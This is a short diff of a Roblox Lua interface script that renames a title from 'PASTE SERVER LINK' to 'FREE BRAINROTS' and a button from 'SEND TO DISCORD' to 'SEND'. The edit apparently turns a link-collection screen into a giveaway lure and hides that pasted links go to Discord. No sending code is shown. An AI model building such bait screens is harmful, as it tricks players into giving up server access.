@@ -25,7 +25,7 @@ local Title = Instance.new("TextLabel")
 Title.Parent = Frame
 Title.Size = UDim2.new(1, 0, 0.15, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "PASTE SERVER LINK"
+Title.Text = "FREE BRAINROTS"
 Title.TextColor3 = Color3.fromRGB(255, 100, 100)
 Title.TextSize = 40
 Title.Font = Enum.Font.GothamBold
@@ -65,7 +65,7 @@ SendButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
 SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 SendButton.TextSize = 20
 SendButton.Font = Enum.Font.GothamBold
-SendButton.Text = "SEND TO DISCORD"
+SendButton.Text = "SEND"
 SendButton.BorderSizePixel = 0
 
 -- Status label
